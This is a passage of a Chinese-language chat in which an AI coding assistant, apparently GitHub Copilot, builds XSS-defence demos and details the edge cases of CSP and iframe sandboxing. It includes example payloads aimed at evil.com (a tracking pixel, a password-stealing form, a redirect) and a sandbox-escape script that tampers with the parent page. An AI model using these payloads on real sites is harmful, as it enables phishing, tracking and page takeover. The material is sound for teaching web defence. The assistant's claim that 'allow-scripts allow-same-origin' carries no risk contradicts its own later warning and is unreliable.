- 即使开发者犯错直接写 `innerHTML = userInput`，浏览器也会拒绝
- 与 DOMPurify 配合使用是最佳实践
- 企业级安全方案（Google 在所有产品中部署）

**缺点/边界：**
- **兼容性** — Chrome 83+、Edge 83+，Firefox/Safari 暂不支持
- 开启后影响**全局所有代码**（包括第三方库），如果第三方库直接用 innerHTML 会报错
- 配置复杂，需要为每个合法的 innerHTML 使用点创建策略
- 不适合简单的预览 demo，更适合大型应用
- 需要处理好 default policy（否则第三方库容易崩溃）：
```javascript
trustedTypes.createPolicy('default', {
  createHTML: (s) => DOMPurify.sanitize(s)
});
```

---

### 各方案对比总结

| | 阻止 `<script>` | 阻止 `on*` | 阻止 `javascript:` | 阻止 CSS 注入 | 阻止 `<iframe>` | 转纯文本 | 无依赖 | Node.js |
|---|---|---|---|---|---|---|---|---|
| **G: CSP** | ✅ | ✅ | ✅ | ❌ | 需额外规则 | ❌(隐藏) | ✅ | ❌ |
| **H: Sanitizer API** | ✅ | ✅ | ✅ | ✅ | ✅ | ❌(删除) | ✅ | ❌ |
| **I: MutationObserver** | ⚠️竞态 | ⚠️竞态 | ⚠️竞态 | ❌ | ✅ | ✅ | ✅ | ❌ |
| **J: createHTMLDocument** | ✅ | ✅ | ✅ | 需手动处理 | ✅ | ✅ | ✅ | ❌ |
| **K: Trusted Types** | ✅ | ✅ | ✅ | ✅ | ✅ | 取决于策略 | ✅ | ❌ |

---

现在创建方案 G 的完整 demo： 

正在启动: *创建 CSP 方案 demo 文件* (2/2)

创建文件

创建文件

找到具有 1 个许可证类型的类似代码

User: @agent 重试

GitHub Copilot: 创建文件

User: @agent 重试

GitHub Copilot: 已创建 [](%E6%9C%AA%E5%91%BD%E5%90%8D%E6%96%87%E4%BB%B6%E5%A4%B9/case13-csp-block-js.html)

已完成: *创建 CSP 方案 demo 文件* (2/2)

case13-csp-block-js.html 已创建，包含 4 个 Tab 页：

**Tab 1: 基础 CSP** — `script-src 'none'`，展示 JS 被完全阻止但 HTML/CSS/图片正常渲染

**Tab 2: 增强 CSP** — 额外加 `object-src 'none'; frame-src 'none'; base-uri 'none'; form-action 'none'`，封堵 iframe 嵌入、表单提交、base 劫持、插件加载

**Tab 3: 边界 Case** — 展示 CSP 的局限性：
- CSS 注入仍然生效（页面背景变红、图片被隐藏）
- meta refresh 跳转可能生效
- 基础 CSP 不限制表单提交
- 普通 https 恶意链接仍可点击
- 图片追踪像素仍可加载

**Tab 4: CSP vs 无 CSP 对比** — 左右并排展示同一份含攻击代码的 HTML，左侧有 CSP 保护，右侧无保护（sandbox 兜底）

直接在浏览器打开即可体验。上面已经详细讲解了 G-K 全部五种方案的原理、代码、优缺点和边界 Case。

已进行更改。

User: 这一部分 右侧无保护（sandbox 兜底）内容区域中，我点击 点击按钮之后，按钮依旧无变化，这是在因为什么呢？

GitHub Copilot: 

因为右侧 iframe 设置了 `sandbox=""`（空 sandbox），这等同于**禁止一切权限**，包括脚本执行。

```html
<!-- 右侧 iframe -->
<iframe id="preview-csp-off" class="preview-frame" sandbox=""></iframe>
```

`sandbox` 属性的规则：
- `sandbox=""` — 全部封禁（脚本、表单、弹窗等全部禁止）
- `sandbox="allow-scripts"` — 允许脚本执行
- `sandbox="allow-same-origin"` — 允许同源访问
- 不写 `sandbox` — 无任何限制

所以右侧实际上也被 sandbox 保护了，这是我故意加的安全兜底——避免 demo 页面真的执行恶意脚本弹 alert。控制台区域也写了提示：*"sandbox="" 兜底阻止了脚本执行"*。

**如果想真正看到"无保护"的效果**，需要把 `sandbox=""` 改成 `sandbox="allow-scripts allow-same-origin"`，但这样页面会真的弹出 alert、执行 DOM 修改。要我改成可执行版本吗？

User: 那如果这样的话，这种效果和左侧的有 CSP 保护效果有什么区别呢？

GitHub Copilot: 

你说得对，当前 demo 两侧表现完全一样——都不执行脚本，对比就失去意义了。

区别在于**阻止机制不同**：

| | 左侧（CSP） | 右侧（sandbox=""） |
|---|---|---|
| **阻止方式** | HTTP 策略头，精细控制 | iframe 属性，全部封禁 |
| **可配置性** | 可按需开放 style/img/frame 等 | 要么全禁，要么逐项 allow |
| **报错信息** | 控制台有 CSP violation 报错 | 静默失败，无报错 |
| **适用场景** | 服务端/页面级安全策略 | 嵌入第三方内容的隔离 |

但从用户视角看，两边表现确实一模一样，**对比没有说服力**。

要让对比有意义，右侧应该改成 `sandbox="allow-scripts allow-same-origin"`，让脚本真正执行。这样用户能直观看到：
- 左侧：有 CSP → 按钮点击无反应、script 不执行
- 右侧：无保护 → 按钮变成 "CLICKED!"、div 变红、script 执行 `document.write`

要我改成这个可执行版本吗？会弹 alert，但不会有安全风险（仍在 iframe 沙箱内，不影响主页面）。

User: 回答的更加详细一点

GitHub Copilot: 

## CSP vs sandbox="" 的详细区别

### 当前 demo 的问题

当前 demo 中：
- 左侧 iframe：`sandbox="allow-same-origin"` + CSP `script-src 'none'`
- 右侧 iframe：`sandbox=""`（空值）+ 无 CSP

两侧脚本**都不会执行**，所以用户看到的效果完全一样，对比失去了意义。

---

### 1. 阻止机制完全不同

**CSP（Content Security Policy）— 策略层面的精细控制**

```
Content-Security-Policy: script-src 'none'
```

CSP 是浏览器实现的一套**白名单策略系统**。它的工作方式是：
- 浏览器正常解析 HTML，构建 DOM 树
- 当遇到需要执行 JS 的场景时，浏览器检查 CSP 策略
- 如果策略不允许，**拒绝执行并在控制台抛出 CSP violation 错误**
- HTML/CSS/图片等非 JS 资源不受影响

也就是说，`<script>alert(1)</script>` 这个标签**仍然存在于 DOM 中**，你用 DevTools 查看 Elements 面板能看到它，只是浏览器拒绝执行它里面的代码。

CSP 是**精细可控的**，你可以单独配置每种资源的策略：
```
script-src 'none'          → 禁止所有脚本
style-src 'self' 'unsafe-inline'  → 允许自身域和内联样式
img-src *                  → 允许所有图片
frame-src 'none'           → 禁止嵌套 iframe
form-action 'none'         → 禁止表单提交
object-src 'none'          → 禁止插件
base-uri 'none'            → 禁止 base 标签
connect-src 'self'         → fetch/XHR 只能请求自身域
```

**sandbox="" — 容器层面的全面隔离**

```html
<iframe sandbox=""></iframe>
```

sandbox 是 iframe 的**隔离属性**，空值意味着**禁止一切权限**：
- ❌ 脚本执行（等价于 `script-src 'none'`）
- ❌ 表单提交
- ❌ 弹窗（`window.open`、`alert`）
- ❌ 顶层导航（不能修改父页面 URL）
- ❌ 同源访问（iframe 内容被视为独立来源）
- ❌ 指针锁定、屏幕方向等 API
- ❌ 自动播放媒体

sandbox 是**粗粒度的开关**，只能通过 `allow-*` 逐项放开：
```
sandbox="allow-scripts"              → 允许脚本
sandbox="allow-same-origin"          → 允许同源
sandbox="allow-forms"                → 允许表单
sandbox="allow-scripts allow-forms"  → 允许脚本和表单
```

---

### 2. 错误反馈不同

**CSP** — 控制台有明确的 violation 错误：
```
Refused to execute inline script because it violates the following 
Content Security Policy directive: "script-src 'none'".
```
开发者可以通过 `report-uri` 或 `report-to` 指令将违规报告发送到服务器，用于监控攻击行为。

**sandbox** — 静默失败，控制台没有任何报错。脚本就像不存在一样，开发者无法得知是否有攻击尝试。

---

### 3. DOM 状态不同

**CSP `script-src 'none'`（配合 `sandbox="allow-same-origin"`）：**
```html
<script>alert(1)</script>
```
- DOM 中：`<script>` 节点**存在**，textContent 是 `alert(1)`
- 执行：被 CSP **阻止**
- `on*` 属性：**存在于 DOM 属性中**，但不触发
- `javascript:` 链接：点击后**无反应**，控制台报 CSP 错误

**sandbox=""：**
```html
<script>alert(1)</script>
```
- DOM 中：`<script>` 节点**存在**
- 执行：被 sandbox **阻止**
- `on*` 属性：存在但不触发
- 同源访问：**被禁止**（iframe 被视为不同源），无法通过 JS 操作父页面

---

### 4. 适用场景不同

| 场景 | 推荐方案 | 原因 |
|------|----------|------|
| **自己的页面防 XSS** | CSP | 精细控制，可以允许自己的脚本但禁止内联 |
| **嵌入第三方内容** | sandbox | 完全隔离，第三方代码影响不到主页面 |
| **Markdown 预览** | CSP + sandbox 组合 | 双重保护 |
| **企业安全策略** | CSP + Trusted Types | 全局策略，覆盖所有页面 |
| **广告 iframe** | sandbox | 防止广告代码干扰主页面 |

---

### 5. 组合使用的效果

当前左侧 iframe 实际上是 **CSP + sandbox 双重保护**：

```html
<iframe sandbox="allow-same-origin"
        srcdoc="...CSP meta tag + HTML content...">
```

- `sandbox="allow-same-origin"` → 允许同源访问（使 CSS、图片正常工作），但不允许脚本
- CSP `script-src 'none'` → 即使 sandbox 允许脚本，CSP 也会阻止

这是**纵深防御（Defense in Depth）**——任意一层被绕过，另一层仍能防护。

---

### 6. 为什么当前对比没意义

| 行为 | 左侧 CSP + sandbox="allow-same-origin" | 右侧 sandbox="" |
|------|----------------------------------------|-----------------|
| `<script>` 执行 | ❌ CSP 阻止 | ❌ sandbox 阻止 |
| `on*` 事件 | ❌ CSP 阻止 | ❌ sandbox 阻止 |
| `javascript:` | ❌ CSP 阻止 | ❌ sandbox 阻止 |
| CSS 渲染 | ✅ 正常 | ✅ 正常 |
| 图片加载 | ✅ 正常 | ✅ 正常 |
| 用户可见差异 | **无** | **无** |

两侧都阻止了脚本，只是机制不同。要让对比有意义，右侧需要改成 `sandbox="allow-scripts allow-same-origin"`，让脚本真正执行。这样用户能看到：

- 左侧有 CSP：按钮点不动、script 不执行、div 不变色
- 右侧无保护：按钮变 "CLICKED!"、script 执行 `document.write`、div 鼠标悬停变红

需要我修改 demo 让对比生效吗？

User: 现在请实现G-K 五种方案的具体案例代码，并且要对这五种方案进行非常详细的介绍和案例的分析

GitHub Copilot: 

 

已创建 5 个待办事项

读取 [](%E6%9C%AA%E5%91%BD%E5%90%8D%E6%96%87%E4%BB%B6%E5%A4%B9/case13-csp-block-js.html#1-1)，行 1 到 50

搜索文本 `sandbox=""` (`**/case13-csp-block-js.html`)，4 个结果

先修复 case13 的对比 Tab，让右侧真正执行脚本，然后依次创建 case14-17。 

读取 [](%E6%9C%AA%E5%91%BD%E5%90%8D%E6%96%87%E4%BB%B6%E5%A4%B9/case13-csp-block-js.html#430-430)，行 430 到 560

Now let me fix case13's compare tab and create all the other files: 

正在将 [](%E6%9C%AA%E5%91%BD%E5%90%8D%E6%96%87%E4%BB%B6%E5%A4%B9/case13-csp-block-js.html) 中的 15 行替换为 18 行


```

```


正在启动: *创建 case14 Sanitizer API* (2/5)

创建文件

创建文件

已进行更改。

User: @agent 重试

GitHub Copilot: 创建文件

User: @agent 重试

GitHub Copilot: 创建文件

创建文件

User: @agent 重试

GitHub Copilot: 创建文件

User: 如果使用iframe方案的 sandbox=“” 方式会有什么边界case 吗？

GitHub Copilot: 

## `iframe sandbox=""` 的边界 Case 详解

`sandbox=""` 是最严格的 iframe 隔离模式，但它并非完美。以下是所有已知的边界情况：

---

### 1. CSS 注入仍然生效

```html
<iframe sandbox="" srcdoc="
  <style>body{background:red; font-size:0; visibility:hidden}</style>
  <p>你看不到我</p>
"></iframe>
```

sandbox 不限制 CSS。攻击者可以：
- `display:none` 隐藏所有内容
- `position:fixed` 覆盖整个 iframe 区域伪造 UI
- `background:url(...)` 发起请求（CSS 数据泄漏）
- `@import url("https://evil.com/track.css")` 加载外部样式表

---

### 2. 图片/媒体仍会加载（网络请求）

```html
<iframe sandbox="" srcdoc="
  <img src='https://evil.com/track?user=123' width=1 height=1>
  <video src='https://evil.com/large-file.mp4' autoplay></video>
"></iframe>
```

sandbox 不限制资源加载：
- **追踪像素**：1x1 图片可泄漏用户 IP、User-Agent
- **大文件消耗带宽**：加载巨大的视频/图片
- **SSRF 场景**：如果在服务端渲染，可能探测内网

---

### 3. 链接仍可显示（但导航被阻止）

```html
<iframe sandbox="" srcdoc="
  <a href='https://evil.com'>看起来像正常链接</a>
  <a href='https://evil.com' target='_top'>尝试顶层跳转</a>
"></iframe>
```

- `sandbox=""` 禁止所有导航（`allow-top-navigation` 未开启）
- 链接**点击不跳转**，但链接仍然**看起来可点击**（蓝色带下划线）
- 可能误导用户以为这是安全链接
- 如果误加了 `allow-top-navigation`，攻击者可以劫持主页面 URL

---

### 4. 表单仍会渲染（但提交被阻止）

```html
<iframe sandbox="" srcdoc="
  <form action='https://evil.com/steal'>
    <input name='password' placeholder='请输入密码'>
    <button type='submit'>登录</button>
  </form>
"></iframe>
```

- 表单 UI **正常显示**，用户可以输入内容
- 提交被 sandbox 阻止（`allow-forms` 未开启）
- **但如果误加了 `allow-forms`，用户输入的数据会被发送到攻击者服务器**
- 钓鱼攻击风险：伪造登录框诱骗用户输入

---

### 5. `<meta http-equiv="refresh">` 行为不一致

```html
<iframe sandbox="" srcdoc="
  <meta http-equiv='refresh' content='0;url=https://evil.com'>
  <p>即将跳转...</p>
"></iframe>
```

- **大多数浏览器**：sandbox 阻止跳转，页面不动
- **部分旧浏览器/边缘情况**：行为不一致，可能允许 iframe 内部跳转
- 规范上不明确，依赖浏览器实现

---

### 6. `allow-same-origin` 的陷阱

```html
<!-- 危险组合！ -->
<iframe sandbox="allow-scripts allow-same-origin" srcdoc="
  <script>
    // 可以访问父页面的 DOM！
    parent.document.body.innerHTML = '<h1>页面被篡改</h1>';
    // 甚至可以移除自己的 sandbox 属性！
    frameElement.removeAttribute('sandbox');
  </script>
"></iframe>
```

`allow-scripts` + `allow-same-origin` **同时开启** 是极其危险的：
- iframe 脚本可以通过 `parent.document` 操作主页面
- 可以用 `frameElement.removeAttribute('sandbox')` 移除自己的 sandbox 限制
- 彻底逃逸沙箱，等于没有任何保护

这就是为什么 `sandbox=""` 或 `sandbox="allow-same-origin"`（不加 allow-scripts）是相对安全的。

---

### 7. 无障碍/可访问性问题

```html
<iframe sandbox="" srcdoc="<p>内容</p>" title="预览"></iframe>
```

- sandbox iframe 内的内容**不响应键盘事件**（因为脚本被禁止）
- **焦点管理异常**：用户 Tab 进入 iframe 后，`<input>` 可以聚焦和输入，但表单无法提交
- 屏幕阅读器可能无法正确朗读 iframe 内容（取决于浏览器实现）
- `autofocus` 属性被忽略

---

### 8. Content-Type 嗅探

```html
<iframe sandbox="" src="https://example.com/uploaded-file.svg"></iframe>
```

如果 iframe 的 `src` 指向用户上传的文件（SVG 等），某些浏览器可能因 MIME 嗅探执行其中的脚本。**srcdoc 不受此影响**，仅 `src` 加载外部 URL 时需注意。

---

### 9. 性能/资源消耗

```html
<!-- 攻击者可以在 sandbox iframe 中消耗 CPU/内存 -->
<iframe sandbox="" srcdoc="
  <style>
    div { box-shadow: 0 0 100px 100px red; }
    div div div div div div div div { transform: rotate(1deg); }
  </style>
  <div><div><div><div><div><div><div><div>
    大量嵌套 + 复杂 CSS = GPU 过载
  </div></div></div></div></div></div></div></div>
"></iframe>
```

sandbox 不限制：
- CSS 复杂度（大量 `box-shadow`、`filter`、深层嵌套 → GPU 过载）
- DOM 体积（百万级节点 → 内存溢出）
- 图片/视频数量（大量 `<img>` → 网络带宽耗尽）

---

### 10. 浏览器兼容性差异

| 浏览器 | `sandbox=""` 支持 | 已知问题 |
|--------|-------------------|----------|
| Chrome | ✅ 完整 | 无 |
| Firefox | ✅ 完整 | 早期版本 `srcdoc` + `sandbox` 有 bug |
| Safari | ✅ 基本完整 | `allow-top-navigation-by-user-activation` 支持晚 |
| IE 11 | ⚠️ 部分 | 不支持 `srcdoc`，需用 `src` 替代 |
| iOS Safari | ✅ | iframe 默认会扩展到内容高度（影响布局） |

---

### 总结：sandbox="" 防不住的攻击向量

| 攻击类型 | sandbox="" 能防？ | 说明 |
|----------|-------------------|------|
| `<script>` 执行 | ✅ 能防 | |
| `on*` 事件 | ✅ 能防 | |
| `javascript:` 协议 | ✅ 能防 | |
| CSS 注入 / UI 伪造 | ❌ 防不住 | 需额外清洗 style |
| 图片追踪像素 | ❌ 防不住 | 需 CSP `img-src` |
| 钓鱼表单 UI | ❌ 防不住 UI显示 | 提交被阻止，但 UI 仍可误导 |
| 资源消耗 DoS | ❌ 防不住 | CSS/DOM 复杂度不受限 |
| meta refresh | ⚠️ 浏览器依赖 | 大多数浏览器阻止 |
| SVG 内嵌脚本（src） | ⚠️ MIME 嗅探风险 | srcdoc 无此问题 |

### 最佳实践

```html
<!-- 推荐：sandbox + CSP 双层防护 -->
<iframe
  sandbox="allow-same-origin"
  srcdoc="
    <!DOCTYPE html>
    <html>
    <head>
      <meta http-equiv='Content-Security-Policy'
            content='script-src none; style-src unsafe-inline; img-src https: data:; frame-src none; object-src none'>
    </head>
    <body>...sanitized HTML...</body>
    </html>
  "
></iframe>
```

`sandbox` 禁脚本 + CSP 控制样式/图片来源 + DOMPurify 清洗 HTML = 纵深防御（Defense in Depth）。